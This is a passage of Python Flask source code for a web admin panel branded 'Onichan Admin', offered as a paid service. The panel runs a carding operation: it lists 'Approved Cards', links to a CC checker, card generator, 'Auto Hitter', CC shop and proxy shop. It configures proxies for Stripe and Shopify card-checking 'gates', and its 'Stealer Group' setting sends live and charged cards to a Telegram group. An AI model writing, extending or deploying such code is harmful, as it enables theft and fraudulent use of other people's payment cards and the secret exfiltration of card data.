                        {'<span style="background: #4ade80; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 0.7em; margin-left: 10px;">OWNER</span>' if is_main_owner else '<span style="background: #667eea; color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 0.7em; margin-left: 10px;">ADMIN</span>'}
                    </h3>
                </div>
            </div>
            <div style="margin-top: 15px;">
                <h4 style="margin-bottom: 10px;">Permissions</h4>
                {perms_html if perms_html else ""}
                {update_btn}
            </div>
            {pwd_section}
        </div>
        '''
    
    return render_template_string(f"""
    <html>
    <head><title>Permissions - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" class="active" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Permission Control</h1>
                {'<span style="color: #4CAF50;">(Owner Mode)</span>' if owner_logged_in else '<span style="opacity: 0.6;">(View Only)</span>'}
            </div>
            {'<div class="alert alert-success">' + message + '</div>' if message else ''}
            {'<div class="alert alert-error">' + error + '</div>' if error else ''}
            
            <div class="card" style="margin-bottom: 20px;">
                <h2>About Permissions</h2>
                <p style="opacity: 0.8; line-height: 1.6;">
                    Control what each admin can do in the panel. The Owner has all permissions by default.
                    Each admin can have a custom password or use the global admin password.
                </p>
            </div>
            
            <h2 style="margin-bottom: 15px;">Admin Permissions ({len(owners)})</h2>
            {admins_html if admins_html else '<div class="card"><p>No admins configured</p></div>'}
        </div>
    </body>
    </html>
    """)

@app.route('/admin/payments')
@admin_required
def admin_payments():
    from config import DB_PAYMENTS, DB_CRYPTO_PENDING
    
    payments = read_file_lines(DB_PAYMENTS)[-50:][::-1]
    pending = read_file_lines(DB_CRYPTO_PENDING)[-20:][::-1]
    
    payments_html = ""
    for payment in payments:
        parts = payment.split('|')
        if len(parts) >= 6:
            payments_html += f"""
            <tr>
                <td>{parts[0][:19] if len(parts[0]) > 19 else parts[0]}</td>
                <td>{parts[1]}</td>
                <td>{parts[2]}</td>
                <td>{parts[3]}</td>
                <td>{parts[4]}</td>
                <td>{parts[5]}</td>
            </tr>
            """
    
    pending_html = ""
    for p in pending:
        parts = p.split('|')
        if len(parts) >= 6:
            pending_html += f"""
            <tr>
                <td>{parts[0][:20]}</td>
                <td>{parts[1]}</td>
                <td>{parts[3]}</td>
                <td>{parts[4]}</td>
                <td>{parts[5]}</td>
                <td>{parts[9] if len(parts) > 9 else 'N/A'}</td>
            </tr>
            """
    
    return render_template_string(f"""
    <html>
    <head><title>Payments - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" class="active" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Payment History</h1>
            </div>
            <div class="card">
                <h2>Pending Crypto Payments</h2>
                <table>
                    <tr><th>TXN ID</th><th>User ID</th><th>Plan</th><th>Amount</th><th>Crypto</th><th>Status</th></tr>
                    {pending_html if pending_html else '<tr><td colspan="6">No pending payments</td></tr>'}
                </table>
            </div>
            <div class="card">
                <h2>Completed Payments (Last 50)</h2>
                <table>
                    <tr><th>Date</th><th>User ID</th><th>Username</th><th>Plan</th><th>Amount</th><th>Method</th></tr>
                    {payments_html if payments_html else '<tr><td colspan="6">No payments yet</td></tr>'}
                </table>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/banned', methods=['GET', 'POST'])
@admin_required
def admin_banned():
    from config import DB_BANNED
    message = ""
    error = ""
    can_manage = current_admin_has_permission('can_manage_banned')
    
    # Only process POST if user has permission
    if request.method == 'POST':
        if not can_manage:
            error = "You don't have permission to manage banned users!"
        else:
            action = request.form.get('action', '')
            user_id = request.form.get('user_id', '')
            
            if action == 'unban' and user_id:
                banned = read_file_lines(DB_BANNED)
                banned = [b for b in banned if b != user_id]
                write_file_lines(DB_BANNED, banned)
                message = f"Unbanned user {user_id}"
            elif action == 'ban' and user_id:
                banned = read_file_lines(DB_BANNED)
                if user_id not in banned:
                    banned.append(user_id)
                    write_file_lines(DB_BANNED, banned)
                    message = f"Banned user {user_id}"
    
    banned_users = read_file_lines(DB_BANNED)
    banned_html = ""
    for user in banned_users:
        unban_btn = f'''
                <form method="POST" style="display:inline;">
                    <input type="hidden" name="action" value="unban">
                    <input type="hidden" name="user_id" value="{user}">
                    <button type="submit" class="btn btn-success">Unban</button>
                </form>
        ''' if can_manage else '<span style="opacity:0.5;">No permission</span>'
        banned_html += f"""
        <tr>
            <td>{user}</td>
            <td>{unban_btn}</td>
        </tr>
        """
    
    ban_form = '''
            <div class="card">
                <h2>Ban User</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="ban">
                    <input type="text" name="user_id" placeholder="User ID to ban" required>
                    <button type="submit" class="btn btn-danger">Ban User</button>
                </form>
            </div>
    ''' if can_manage else '''
            <div class="card">
                <h2>Ban User</h2>
                <p style="opacity: 0.7;">You don't have permission to ban users.</p>
            </div>
    '''
    
    return render_template_string(f"""
    <html>
    <head><title>Banned - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" class="active" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Banned Users</h1>
                {'<span style="color: #4CAF50;">(Can Manage)</span>' if can_manage else '<span style="opacity: 0.6;">(View Only)</span>'}
            </div>
            {'<div class="alert alert-success">' + message + '</div>' if message else ''}
            {'<div class="alert alert-error">' + error + '</div>' if error else ''}
            {ban_form}
            <div class="card">
                <h2>Banned Users List ({len(banned_users)})</h2>
                <table>
                    <tr><th>User ID</th><th>Action</th></tr>
                    {banned_html if banned_html else '<tr><td colspan="2">No banned users</td></tr>'}
                </table>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/cards')
@admin_required
@permission_required('can_view_cards')
def admin_cards():
    from config import DB_APPROVED_CARDS
    
    cards = read_file_lines(DB_APPROVED_CARDS)[-100:][::-1]
    cards_html = ""
    for card in cards:
        cards_html += f"<tr><td>{card}</td></tr>"
    
    return render_template_string(f"""
    <html>
    <head><title>Approved Cards - Onichan Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" class="active" onclick="closeSidebar()">Approved Cards</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Approved Cards</h1>
            </div>
            <div class="card">
                <h2>Last 100 Approved Cards</h2>
                <table>
                    <tr><th>Card Info</th></tr>
                    {cards_html if cards_html else '<tr><td>No approved cards yet</td></tr>'}
                </table>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/admin/settings', methods=['GET', 'POST'])
@owner_required
def admin_settings():
    settings = get_settings()
    message = ""
    
    if request.method == 'POST':
        action = request.form.get('action', '')
        
        if action == 'toggle_payment':
            current_mode = settings.get('payment_mode', 'crypto')
            settings['payment_mode'] = 'manual' if current_mode == 'crypto' else 'crypto'
            save_settings(settings)
            message = f"Payment mode changed to: {settings['payment_mode'].upper()}"
        
        elif action == 'save_manual_info':
            settings['manual_payment_info'] = request.form.get('manual_payment_info', '')
            settings['manual_payment_address'] = request.form.get('manual_payment_address', '')
            settings['manual_payment_instructions'] = request.form.get('manual_payment_instructions', '')
            save_settings(settings)
            message = "Manual payment settings saved!"
        
        elif action == 'save_netherex_proxy':
            proxy_val = request.form.get('netherex_proxy', '').strip()
            settings['netherex_proxy'] = proxy_val
            save_settings(settings)
            if proxy_val:
                message = f"Stripe Auth (Netherex) proxy saved: {proxy_val}"
            else:
                message = "Stripe Auth (Netherex) proxy removed — using default (no proxy)"
        
        elif action == 'save_shopify_proxy':
            proxy_val = request.form.get('shopify_proxy', '').strip()
            settings['shopify_proxy'] = proxy_val
            save_settings(settings)
            if proxy_val:
                message = f"Shopify (Netherex) proxy saved: {proxy_val}"
            else:
                message = "Shopify (Netherex) proxy removed — using default (no proxy)"
        
        elif action == 'save_stealer':
            stealer_id = request.form.get('stealer_group_id', '').strip()
            if stealer_id and stealer_id.lstrip('-').isdigit():
                settings['stealer_group_id'] = stealer_id
                message = f"Stealer group set to: {stealer_id}"
            elif stealer_id == '':
                settings['stealer_group_id'] = 'None'
                message = "Stealer group disabled!"
            else:
                message = "Invalid group ID! Must be a number."
            save_settings(settings)
        
        settings = get_settings()
    
    payment_mode = settings.get('payment_mode', 'crypto')
    is_manual = payment_mode == 'manual'
    
    return render_template_string(f"""
    <html>
    <head><title>Settings - Onichan Admin</title>{ADMIN_CSS}
    <style>
        .toggle-switch {{
            position: relative;
            width: 80px;
            height: 40px;
            display: inline-block;
        }}
        .toggle-switch input {{
            opacity: 0;
            width: 0;
            height: 0;
        }}
        .toggle-slider {{
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #e94560;
            transition: 0.4s;
            border-radius: 40px;
        }}
        .toggle-slider:before {{
            position: absolute;
            content: "";
            height: 32px;
            width: 32px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: 0.4s;
            border-radius: 50%;
        }}
        input:checked + .toggle-slider {{
            background-color: #4ade80;
        }}
        input:checked + .toggle-slider:before {{
            transform: translateX(40px);
        }}
        .mode-label {{
            font-size: 1.2em;
            font-weight: bold;
            padding: 10px 20px;
            border-radius: 8px;
            display: inline-block;
            margin-left: 15px;
        }}
        .mode-crypto {{ background: rgba(233, 69, 96, 0.3); color: #e94560; }}
        .mode-manual {{ background: rgba(74, 222, 128, 0.3); color: #4ade80; }}
        textarea {{
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255,255,255,0.1);
            color: #fff;
            font-size: 14px;
            resize: vertical;
            min-height: 80px;
        }}
        textarea::placeholder {{ color: rgba(255,255,255,0.5); }}
    </style>
    </head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" class="active" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header">
                <h1>Payment Settings</h1>
                <span style="color: #4CAF50;">(Owner Only)</span>
            </div>
            {'<div class="alert alert-success">' + message + '</div>' if message else ''}
            
            <div class="card">
                <h2>Payment Gateway Mode</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Toggle between automatic crypto payments (CoinPayments) and manual payments.</p>
                
                <form method="POST" style="display: flex; align-items: center; flex-wrap: wrap; gap: 15px;">
                    <input type="hidden" name="action" value="toggle_payment">
                    <label class="toggle-switch">
                        <input type="checkbox" {("checked" if is_manual else "")} onchange="this.form.submit()">
                        <span class="toggle-slider"></span>
                    </label>
                    <span class="mode-label {('mode-manual' if is_manual else 'mode-crypto')}">
                        {('MANUAL PAYMENTS' if is_manual else 'CRYPTO (COINPAYMENTS)')}
                    </span>
                </form>
                
                <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 10px;">
                    <p><strong>Current Mode:</strong> {('Manual - Customers contact you directly for payment' if is_manual else 'Crypto - CoinPayments gateway handles payments automatically')}</p>
                </div>
            </div>
            
            <div class="card" style="{('opacity: 1;' if is_manual else 'opacity: 0.5;')}">
                <h2>Manual Payment Configuration</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">{('Configure what customers see when they use /buy command.' if is_manual else 'Enable manual mode to configure these settings.')}</p>
                
                <form method="POST">
                    <input type="hidden" name="action" value="save_manual_info">
                    
                    <div class="form-group">
                        <label>Contact Info (shown to customers)</label>
                        <input type="text" name="manual_payment_info" value="{settings.get('manual_payment_info', '')}" 
                               placeholder="e.g., Contact @username for payment" style="width: 100%;" {('disabled' if not is_manual else '')}>
                    </div>
                    
                    <div class="form-group">
                        <label>Payment Address (crypto/bank/etc)</label>
                        <input type="text" name="manual_payment_address" value="{settings.get('manual_payment_address', '')}" 
                               placeholder="e.g., LTC address, UPI ID, or bank details" style="width: 100%;" {('disabled' if not is_manual else '')}>
                    </div>
                    
                    <div class="form-group">
                        <label>Additional Instructions</label>
                        <textarea name="manual_payment_instructions" placeholder="Any additional payment instructions for customers..." {('disabled' if not is_manual else '')}>{settings.get('manual_payment_instructions', '')}</textarea>
                    </div>
                    
                    <button type="submit" class="btn btn-success" {('disabled' if not is_manual else '')}>Save Manual Payment Settings</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Stripe Auth API Proxy (Netherex)</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Set a proxy for the /st (Stripe Auth) gate. Leave empty to use the API without a proxy.</p>
                
                <form method="POST">
                    <input type="hidden" name="action" value="save_netherex_proxy">
                    
                    <div class="form-group">
                        <label>Proxy (ip:port or user:pass@ip:port)</label>
                        <input type="text" name="netherex_proxy" value="{settings.get('netherex_proxy', '')}" 
                               placeholder="e.g., 1.2.3.4:8080 or user:pass@1.2.3.4:8080" style="width: 100%;">
                        <p style="font-size: 0.85em; opacity: 0.6; margin-top: 8px;">
                            Supported formats: <code>ip:port</code>, <code>user:pass@ip:port</code>, <code>http://ip:port</code>
                        </p>
                    </div>
                    
                    <button type="submit" class="btn btn-success">Save Proxy Settings</button>
                </form>
                
                <div style="margin-top: 15px; padding: 15px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border: 1px solid rgba(233, 69, 96, 0.3);">
                    <p style="color: {('#4ade80' if settings.get('netherex_proxy') and settings.get('netherex_proxy').strip() else '#e94560')};">
                        <strong>Current Status:</strong> {('Proxy: ' + settings.get('netherex_proxy', '') if settings.get('netherex_proxy') and settings.get('netherex_proxy').strip() else 'No proxy — using default (direct connection)')}
                    </p>
                </div>
            </div>
            
            <div class="card">
                <h2>Shopify API Proxy (Netherex)</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Set a proxy for the /sh (Shopify) gate. Leave empty to use the API without a proxy.</p>
                
                <form method="POST">
                    <input type="hidden" name="action" value="save_shopify_proxy">
                    
                    <div class="form-group">
                        <label>Proxy (host:port:user:pass)</label>
                        <input type="text" name="shopify_proxy" value="{settings.get('shopify_proxy', '')}" 
                               placeholder="e.g., 1.2.3.4:8080:user:pass or host:port" style="width: 100%;">
                        <p style="font-size: 0.85em; opacity: 0.6; margin-top: 8px;">
                            Supported formats: <code>host:port</code>, <code>host:port:user:pass</code>
                        </p>
                    </div>
                    
                    <button type="submit" class="btn btn-success">Save Proxy Settings</button>
                </form>
                
                <div style="margin-top: 15px; padding: 15px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border: 1px solid rgba(233, 69, 96, 0.3);">
                    <p style="color: {('#4ade80' if settings.get('shopify_proxy') and settings.get('shopify_proxy').strip() else '#e94560')};">
                        <strong>Current Status:</strong> {('Proxy: ' + settings.get('shopify_proxy', '') if settings.get('shopify_proxy') and settings.get('shopify_proxy').strip() else 'No proxy — using default (direct connection)')}
                    </p>
                </div>
            </div>
            
            <div class="card">
                <h2>Stealer Group Configuration</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Approved/live/charged cards will be automatically sent to this Telegram group.</p>
                
                <form method="POST">
                    <input type="hidden" name="action" value="save_stealer">
                    
                    <div class="form-group">
                        <label>Stealer Group ID</label>
                        <input type="text" name="stealer_group_id" value="{settings.get('stealer_group_id', '')}" 
                               placeholder="e.g., -1001234567890" style="width: 100%;">
                        <p style="font-size: 0.85em; opacity: 0.6; margin-top: 8px;">
                            Use /getid command in your private group to get the Chat ID. Leave empty to disable.
                        </p>
                    </div>
                    
                    <button type="submit" class="btn btn-success">Save Stealer Settings</button>
                </form>
                
                <div style="margin-top: 15px; padding: 15px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border: 1px solid rgba(233, 69, 96, 0.3);">
                    <p style="color: #e94560;"><strong>Current Status:</strong> {('Enabled - Group ID: ' + str(settings.get('stealer_group_id', '')) if settings.get('stealer_group_id') and settings.get('stealer_group_id') != 'None' else 'Disabled - No group configured')}</p>
                </div>
            </div>
        </div>
    </body>
    </html>
    """)

# ============================================================
# USER PANEL ROUTES
# ============================================================

USER_CSS = """
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#1e0f2d">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap');
    
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    
    html {
        height: -webkit-fill-available;
        scroll-behavior: smooth;
    }
    
    body {
        font-family: 'Nunito', 'Segoe UI', sans-serif;
        background: linear-gradient(135deg, #1a0a1f 0%, #2d1b3d 30%, #1f1a3d 60%, #0d0a1f 100%);
        min-height: 100vh;
        min-height: -webkit-fill-available;
        color: #fff;
        position: relative;
        overflow-x: hidden;
        padding-bottom: env(safe-area-inset-bottom);
    }
    
    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: 
            radial-gradient(ellipse at 20% 20%, rgba(255,105,180,0.15) 0%, transparent 50%),
            radial-gradient(ellipse at 80% 80%, rgba(138,43,226,0.15) 0%, transparent 50%),
            radial-gradient(ellipse at 50% 50%, rgba(255,20,147,0.08) 0%, transparent 60%);
        pointer-events: none;
        z-index: 0;
    }
    
    .sparkles {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1;
        background-image: 
            radial-gradient(2px 2px at 20px 30px, #ff69b4, transparent),
            radial-gradient(2px 2px at 40px 70px, #ff1493, transparent),
            radial-gradient(2px 2px at 50px 160px, #da70d6, transparent),
            radial-gradient(2px 2px at 90px 40px, #ff69b4, transparent),
            radial-gradient(2px 2px at 130px 80px, #ba55d3, transparent),
            radial-gradient(2px 2px at 160px 120px, #ff1493, transparent);
        background-size: 200px 200px;
        animation: sparkle 4s linear infinite;
    }
    
    @keyframes sparkle {
        0%, 100% { opacity: 0.5; }
        50% { opacity: 1; }
    }
    
    .sidebar {
        position: fixed;
        left: 0;
        top: 0;
        width: 260px;
        height: 100vh;
        height: 100dvh;
        background: linear-gradient(180deg, rgba(45,27,61,0.95) 0%, rgba(30,15,45,0.98) 100%);
        padding: 20px;
        padding-bottom: calc(40px + env(safe-area-inset-bottom));
        backdrop-filter: blur(15px);
        border-right: 1px solid rgba(255,105,180,0.2);
        z-index: 100;
        box-shadow: 4px 0 30px rgba(255,20,147,0.1);
        overflow-y: auto;
        overflow-x: hidden;
        -webkit-overflow-scrolling: touch;
        overscroll-behavior: contain;
        touch-action: pan-y;
    }
    .sidebar::-webkit-scrollbar { width: 4px; }
    .sidebar::-webkit-scrollbar-track { background: transparent; }
    .sidebar::-webkit-scrollbar-thumb {
        background: rgba(255,105,180,0.5);
        border-radius: 4px;
    }
    
    .sidebar-header {
        text-align: center;
        margin-bottom: 25px;
        padding-bottom: 20px;
        border-bottom: 1px solid rgba(255,105,180,0.2);
    }
    
    .sidebar h2 {
        background: linear-gradient(135deg, #ff69b4, #ff1493, #da70d6);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        font-size: 1.6em;
        font-weight: 800;
        text-shadow: 0 0 30px rgba(255,105,180,0.5);
    }
    
    .sidebar-subtitle {
        font-size: 0.8em;
        color: #da70d6;
        margin-top: 5px;
        opacity: 0.8;
    }
    
    .nav-section {
        margin-bottom: 15px;
    }
    
    .nav-section-title {
        font-size: 0.75em;
        color: #ff69b4;
        text-transform: uppercase;
        letter-spacing: 1px;
        padding: 10px 15px 5px;
        opacity: 0.7;
    }
    
    .sidebar a {
        display: flex;
        align-items: center;
        gap: 12px;
        color: #fff;
        text-decoration: none;
        padding: 12px 15px;
        margin: 4px 0;
        border-radius: 12px;
        transition: all 0.3s ease;
        font-weight: 600;
        position: relative;
        overflow: hidden;
    }
    
    .sidebar a::before {
        content: '';
        position: absolute;
        left: 0;
        top: 0;
        width: 0;
        height: 100%;
        background: linear-gradient(90deg, rgba(255,105,180,0.3), transparent);
        transition: width 0.3s;
    }
    
    .sidebar a:hover::before, .sidebar a.active::before {
        width: 100%;
    }
    
    .sidebar a:hover, .sidebar a.active {
        color: #ff69b4;
        transform: translateX(5px);
        text-shadow: 0 0 10px rgba(255,105,180,0.5);
    }
    
    .sidebar a.active {
        background: rgba(255,105,180,0.15);
        border-left: 3px solid #ff1493;
    }
    
    .main {
        margin-left: 260px;
        padding: 30px;
        position: relative;
        z-index: 10;
    }
    
    .header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 30px;
        padding-bottom: 20px;
        border-bottom: 1px solid rgba(255,105,180,0.2);
    }
    
    .header h1 { 
        font-size: 2.2em;
        font-weight: 800;
        background: linear-gradient(135deg, #fff 0%, #ff69b4 50%, #da70d6 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }
    
    .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 20px;
        margin-bottom: 30px;
    }
    
    .stat-card {
        background: linear-gradient(145deg, rgba(255,105,180,0.1), rgba(138,43,226,0.1));
        padding: 25px;
        border-radius: 20px;
        text-align: center;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255,105,180,0.2);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }
    
    .stat-card::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, rgba(255,105,180,0.1) 0%, transparent 70%);
        opacity: 0;
        transition: opacity 0.3s;
    }
    
    .stat-card:hover::before {
        opacity: 1;
    }
    
    .stat-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 40px rgba(255,20,147,0.2);
        border-color: rgba(255,105,180,0.4);
    }
    
    .stat-card h3 {
        font-size: 2.2em;
        background: linear-gradient(135deg, #ff69b4, #ff1493);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        margin-bottom: 10px;
        font-weight: 800;
    }
    
    .stat-card p { opacity: 0.8; font-weight: 600; }
    
    .card {
        background: linear-gradient(145deg, rgba(45,27,61,0.8), rgba(30,15,45,0.9));
        padding: 25px;
        border-radius: 20px;
        margin-bottom: 20px;
        backdrop-filter: blur(15px);
        border: 1px solid rgba(255,105,180,0.15);
        box-shadow: 0 5px 30px rgba(0,0,0,0.3);
    }
    
    .card h2 {
        margin-bottom: 20px;
        background: linear-gradient(135deg, #ff69b4, #da70d6);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        font-weight: 700;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    .table-wrapper {
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        margin: 0 -10px;
        padding: 0 10px;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        min-width: 400px;
    }
    
    th, td {
        padding: 14px;
        text-align: left;
        border-bottom: 1px solid rgba(255,105,180,0.1);
        white-space: nowrap;
    }
    
    th { 
        color: #ff69b4; 
        font-weight: 700;
        text-transform: uppercase;
        font-size: 0.85em;
        letter-spacing: 0.5px;
    }
    
    tr:hover {
        background: rgba(255,105,180,0.05);
    }
    
    .btn {
        padding: 12px 24px;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        font-size: 0.95em;
        font-weight: 700;
        transition: all 0.3s ease;
        text-decoration: none;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        position: relative;
        overflow: hidden;
    }
    
    .btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
        transition: left 0.5s;
    }
    
    .btn:hover::before {
        left: 100%;
    }
    
    .btn-primary { 
        background: linear-gradient(135deg, #ff1493, #ff69b4);
        color: #fff;
        box-shadow: 0 4px 20px rgba(255,20,147,0.4);
    }
    
    .btn-success { 
        background: linear-gradient(135deg, #10b981, #34d399);
        color: #fff;
        box-shadow: 0 4px 20px rgba(16,185,129,0.4);
    }
    
